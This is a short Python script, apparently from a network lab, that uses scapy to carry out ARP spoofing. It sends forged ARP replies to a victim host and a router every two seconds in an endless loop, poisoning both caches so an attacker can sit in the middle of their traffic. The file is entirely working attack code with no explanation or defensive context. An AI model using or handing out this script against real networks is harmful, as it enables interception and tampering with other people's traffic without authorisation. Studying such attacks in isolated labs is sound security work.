from scapy.all import ARP, Ether, sendp
import time

victim_ip   = "192.168.10.10"
router_ip   = "192.168.10.1"
attacker_iface = "attacker-eth0"

arp_to_victim = ARP(op=2, pdst=victim_ip, psrc=router_ip)
arp_to_router = ARP(op=2, pdst=router_ip, psrc=victim_ip)

print("ARP Spoofing started...")
while True:
    sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/arp_to_victim,
          iface=attacker_iface, verbose=0)
    sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/arp_to_router,
          iface=attacker_iface, verbose=0)
    print("ARP packets sent!")
    time.sleep(2)